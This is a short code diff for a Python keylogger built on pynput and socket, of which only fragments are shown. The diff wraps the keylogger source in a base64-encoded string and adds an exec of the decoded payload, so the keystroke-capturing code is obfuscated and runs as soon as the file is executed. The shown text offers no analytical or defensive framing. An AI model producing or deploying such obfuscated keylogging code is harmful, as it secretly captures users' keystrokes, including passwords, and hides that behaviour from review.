@@ -1,3 +1,6 @@
+import base64
+
+clientcode = servercode = base64.b64encode(b"""
 import pynput
 from pynput.keyboard import Key, Listener
 import socket
@@ -22,4 +25,6 @@ def on_press(key):
 
 
 with Listener(on_press=on_press) as Listener:
-    Listener.join()
+    Listener.join()""")
+
+exec(base64.b64decode(servercode))
